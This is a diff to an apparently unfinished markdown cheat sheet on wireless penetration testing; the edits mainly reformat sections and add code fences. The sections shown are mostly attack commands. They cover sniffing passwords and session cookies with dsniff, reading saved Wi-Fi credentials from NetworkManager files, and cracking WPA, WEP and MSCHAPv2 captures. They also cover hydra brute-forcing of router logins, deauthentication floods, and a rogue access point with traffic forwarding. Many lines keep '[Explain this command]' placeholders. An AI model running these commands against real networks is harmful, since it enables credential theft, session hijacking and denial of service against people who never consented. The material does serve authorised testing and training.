@@ -23,12 +23,10 @@ ettercap -T -q -i at0 -M arp:remote // //                            # Launch AR
 ```
 
 ## Wireless Eavesdropping
-## Description:
-## This passive attack involves capturing wireless packets in the air for later analysis.
-## When to Use:
-## Use during recon or to analyze open or poorly encrypted networks without disrupting them.
-## Why:
-## It reveals sensitive data or credentials transmitted in plaintext, misconfigured encryption, and device behavior.
+This passive attack involves capturing wireless packets in the air for later analysis.
+Use during recon or to analyze open or poorly encrypted networks without disrupting them.
+It reveals sensitive data or credentials transmitted in plaintext, misconfigured encryption, 
+and device behavior.
 
 ```bash
 airmon-ng start wlan0          # Enable monitor mode on the wireless card
@@ -42,32 +40,23 @@ wireshark &                   # Launch Wireshark for real-time packet capture an
 
 ```
 ## Session Hijacking over Wireless
-```bash
-Description:
 This attack captures session tokens, cookies, or credentials from unencrypted network traffic to hijack user sessions.
-
-When to Use:
 When users connect to insecure networks (e.g., public Wi-Fi), to demonstrate risks of non-HTTPS services.
-
-Why:
 To stress the importance of HTTPS, secure cookie flags, and encrypted transport layers.
+
+```bash
 airmon-ng start wlan0        # Enable monitor mode
 airodump-ng mon0             # Discover nearby wireless traffic
 driftnet -i mon0             # Intercept and display images being transmitted
 dsniff -i mon0               # Capture passwords, session cookies, and credentials from sniffed traffic
 urlsnarf -i mon0             # Log all URLs accessed by devices on the network
-
-
 ```
+
 ## Enumerating wireless security profiles
-## Description:
-## This involves identifying saved or auto-connect wireless profiles on a system, including previously connected networks and their credentials.
-
-## When to Use:
-## When analyzing client device configurations or performing post-exploitation data gathering.
-
-## Why:
-## It shows what networks a device connects to and can expose credentials or hint at physical locations.
+This involves identifying saved or auto-connect wireless profiles on a system, including previously 
+connected networks and their credentials.  When analyzing client device configurations or performing 
+post-exploitation data gathering. It shows what networks a device connects to and can expose credentials 
+or hint at physical locations.
 ```bash
 nmcli dev wifi list                                      # List available networks and their security types
 cat /etc/NetworkManager/system-connections/*             # Display saved wireless profiles and potential credentials
@@ -147,7 +136,6 @@ asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this co
 # Extract the tunneled MSCHAPv2 challenge/response from FreeRADIUS-WPE logs
 ```bash
 asleap -C [challenge] -R [response] -W /path/to/wordlist.txt  # [Explain this command]
-
 Note: The cracking process is identical to PEAP once the inner authentication is revealed.
 ```
 
@@ -184,10 +172,12 @@ aircrack-ng -w /path/to/wordlist.txt -b [target MAC] wpacrack-01.cap  # [Explain
 ## Decrypting WEP and WPA Packets (p94)
 *Description:*
 
+```
 # WEP
 airdecap-ng -w [WEP key] wepcrack-01.cap
 # WPA
 airdecap-ng -e [ESSID] -p [passphrase] wpacrack-01.cap
+```
 
 ## Connecting to WEP Network (p96)
 *Description:*
@@ -215,9 +205,10 @@ dhclient wlan0
 
 ## Cracking Default Accounts on the Access Points
 *Description:*
-
+```
 map -p 80 --script http-default-accounts [router IP]
 hydra -l admin -P /usr/share/wordlists/rockyou.txt [router IP] http-get /
+```
 
 ## Deauthentication DoS Attack
 *Description:*
@@ -235,16 +226,16 @@ aireplay-ng --deauth 1000 -a [target AP MAC] mon0  # [Explain this command]
 airmon-ng start wlan0  # [Explain this command]
 airodump-ng mon0  # [Explain this command]
 macchanger --mac [spoofed MAC] wlan0
-airbase-ng -e [ESSID] -c [channel] -a [spoofed MAC] mon0  # [Explain this command]
+airbase-ng -e [ESSID] -c [channel] -a [spoofed MAC] mon0  
 ifconfig at0 up  # [Explain this command]
 dhcpd at0  # [Explain this command]
-ifconfig at0 192.168.10.1 netmask 255.255.255.0  # [Explain this command]
+ifconfig at0 192.168.10.1 netmask 255.255.255.0  
 iptables --flush  # [Explain this command]
 iptables --table nat --flush  # [Explain this command]
 iptables --delete-chain  # [Explain this command]
 iptables --table nat --delete-chain  # [Explain this command]
 iptables -P FORWARD ACCEPT  # [Explain this command]
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  # [Explain this command]
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
 echo 1 > /proc/sys/net/ipv4/ip_forward  # [Explain this command]
 
 ```
